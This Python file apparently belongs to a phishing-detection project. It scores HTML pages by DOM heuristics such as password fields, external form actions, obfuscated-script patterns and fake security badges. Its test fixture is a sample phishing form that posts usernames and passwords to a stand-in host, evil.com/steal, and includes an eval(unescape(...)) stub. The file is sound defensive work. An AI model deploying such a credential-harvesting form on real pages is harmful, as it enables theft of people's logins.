"""
DOM Structural Analyzer - Detects suspicious page structures
Person 1: AI Intelligence Engineer
"""
from typing import Dict, Any, List
from bs4 import BeautifulSoup
import re


class DOMAnalyzer:
    """Analyze DOM structure for phishing indicators"""
    
    def __init__(self):
        self.suspicious_patterns = {
            'password_fields': 0.3,
            'hidden_inputs': 0.2,
            'external_forms': 0.25,
            'iframe_usage': 0.2,
            'obfuscated_js': 0.3,
            'fake_ssl_indicators': 0.4,
            'excessive_redirects': 0.35
        }
    
    def analyze(self, html: str, url: str = "") -> Dict[str, Any]:
        """Analyze HTML DOM structure"""
        if not html:
            return {'score': 0.0, 'features': {}, 'reasons': []}
        
        soup = BeautifulSoup(html, 'html.parser')
        features = {}
        reasons = []
        score = 0.0
        
        # 1. Password field detection
        password_fields = soup.find_all('input', {'type': 'password'})
        features['password_fields'] = len(password_fields)
        if password_fields:
            score += self.suspicious_patterns['password_fields']
            reasons.append(f"Found {len(password_fields)} password input field(s)")
        
        # 2. Hidden input detection
        hidden_inputs = soup.find_all('input', {'type': 'hidden'})
        features['hidden_inputs'] = len(hidden_inputs)
        if len(hidden_inputs) > 3:
            score += self.suspicious_patterns['hidden_inputs']
            reasons.append(f"Excessive hidden inputs: {len(hidden_inputs)}")
        
        # 3. External form submission
        forms = soup.find_all('form')
        external_forms = 0
        for form in forms:
            action = form.get('action', '')
            if action.startswith('http') and url and action not in url:
                external_forms += 1
        features['external_forms'] = external_forms
        if external_forms > 0:
            score += self.suspicious_patterns['external_forms']
            reasons.append(f"Form submits to external URL")
        
        # 4. Iframe detection
        iframes = soup.find_all('iframe')
        features['iframes'] = len(iframes)
        if len(iframes) > 2:
            score += self.suspicious_patterns['iframe_usage']
            reasons.append(f"Multiple iframes detected: {len(iframes)}")
        
        # 5. Obfuscated JavaScript
        scripts = soup.find_all('script')
        obfuscated_count = 0
        for script in scripts:
            script_text = script.string or ''
            if self._is_obfuscated(script_text):
                obfuscated_count += 1
        features['obfuscated_scripts'] = obfuscated_count
        if obfuscated_count > 0:
            score += self.suspicious_patterns['obfuscated_js']
            reasons.append(f"Obfuscated JavaScript detected")
        
        # 6. Fake SSL indicators
        fake_ssl = self._detect_fake_ssl(soup)
        features['fake_ssl_indicators'] = fake_ssl
        if fake_ssl:
            score += self.suspicious_patterns['fake_ssl_indicators']
            reasons.append("Fake SSL/security indicators in HTML")
        
        # 7. Meta refresh redirects
        meta_refresh = soup.find_all('meta', {'http-equiv': 'refresh'})
        features['meta_redirects'] = len(meta_refresh)
        if meta_refresh:
            score += self.suspicious_patterns['excessive_redirects']
            reasons.append("Meta refresh redirect detected")
        
        # 8. Suspicious input patterns
        all_inputs = soup.find_all('input')
        sensitive_inputs = ['ssn', 'social', 'credit', 'card', 'cvv', 'pin']
        sensitive_count = sum(1 for inp in all_inputs 
                             if any(s in str(inp.get('name', '')).lower() for s in sensitive_inputs))
        features['sensitive_inputs'] = sensitive_count
        if sensitive_count > 0:
            score += 0.25
            reasons.append(f"Requests sensitive information")
        
        return {
            'score': min(score, 1.0),
            'features': features,
            'reasons': reasons[:5],
            'method': 'dom_analysis'
        }
    
    def _is_obfuscated(self, script_text: str) -> bool:
        """Detect obfuscated JavaScript"""
        if not script_text or len(script_text) < 50:
            return False
        
        # Check for common obfuscation patterns
        obfuscation_indicators = [
            r'eval\s*\(',
            r'unescape\s*\(',
            r'String\.fromCharCode',
            r'\\x[0-9a-f]{2}',
            r'\\u[0-9a-f]{4}',
        ]
        
        for pattern in obfuscation_indicators:
            if re.search(pattern, script_text, re.IGNORECASE):
                return True
        
        # Check character entropy (high entropy = likely obfuscated)
        unique_chars = len(set(script_text))
        if unique_chars > 50 and len(script_text) < 500:
            return True
        
        return False
    
    def _detect_fake_ssl(self, soup: BeautifulSoup) -> bool:
        """Detect fake SSL/security indicators in HTML"""
        # Look for fake padlock images or security badges
        images = soup.find_all('img')
        for img in images:
            src = img.get('src', '').lower()
            alt = img.get('alt', '').lower()
            if any(term in src or term in alt for term in ['lock', 'secure', 'ssl', 'verified']):
                return True
        
        # Look for fake security text
        text = soup.get_text().lower()
        fake_indicators = ['secured by', 'ssl protected', 'verified secure']
        return any(indicator in text for indicator in fake_indicators)


if __name__ == "__main__":
    analyzer = DOMAnalyzer()
    
    # Test case
    test_html = """
    <html>
        <body>
            <form action="http://evil.com/steal">
                <input type="text" name="username">
                <input type="password" name="password">
                <input type="hidden" name="token" value="abc">
            </form>
            <script>eval(unescape('%64%6f%63'))</script>
        </body>
    </html>
    """
    
    result = analyzer.analyze(test_html, "https://example.com")
    print(f"DOM Analysis Result: {result}")
